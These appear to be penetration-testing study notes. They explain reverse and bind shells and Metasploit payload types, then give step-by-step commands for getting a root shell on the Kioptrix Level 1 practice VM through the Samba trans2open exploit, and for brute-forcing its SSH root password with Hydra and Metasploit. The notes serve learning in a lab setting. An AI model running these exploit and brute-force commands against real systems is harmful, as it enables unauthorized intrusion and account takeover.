* shell : gives access to a machine

* Reverse Shell :type of shell that establishes a connection from the target system to the attacker's machine. This is typically done by running a Netcat listener on the attacker's machine and running a Netcat client on the target system that connects back to the listener **The advantage of a Netcat reverse shell is that it can bypass firewalls and other network security measures that might block incoming connections.**

* Blind Shell: we open a port on a target machine and then connects to it
* Non-staged payload - sends exploit shellcode all at once; larger; does not always work. For example, windows/meterpreter_reverse_tcp.
* Staged payload - sends payload in stages; less stable. For example, windows/meterpreter/reverse_tcp.
* Gaining Root with metasploit :
```
msfconsole

search trans2open #name of exploit for Samba

use 1 #use exploit/linux/samba/trans2open

options

set RHOSTS 10.0.2.4

show targets #only one (selected) option, Samba 2.2.x

exploit
#does not work due to default payload (staged), so we stop the process and change our payload to non-staged

set payload linux/x86/shell_reverse_tcp
#similar to previous one, but non-staged

options

exploit
#this gives us shell access of root

whoami
#root

hostname
#kioptrix.level1
```

*  Brute Force Using Hydra:

```#using Hydra

hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://10.0.2.4 -t 4 -V
#we want to attack root using unix_passwords.txt wordlist in 4 threads; -V is for verbosity
```

```
#using Metasploit

msfconsole

search ssh

use auxiliary/scanner/ssh/ssh_login

options

set username root

set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

set rhosts 10.0.2.4

set threads 5

set verbose true

exploit
```

* Credential stuffing - Injecting breached account credentials in hopes of account takeover; we can do this using Intruder window in Burp Suite.
* Password spraying - Brute force logins based on list of usernames and common passwords; similar to credential stuffing.
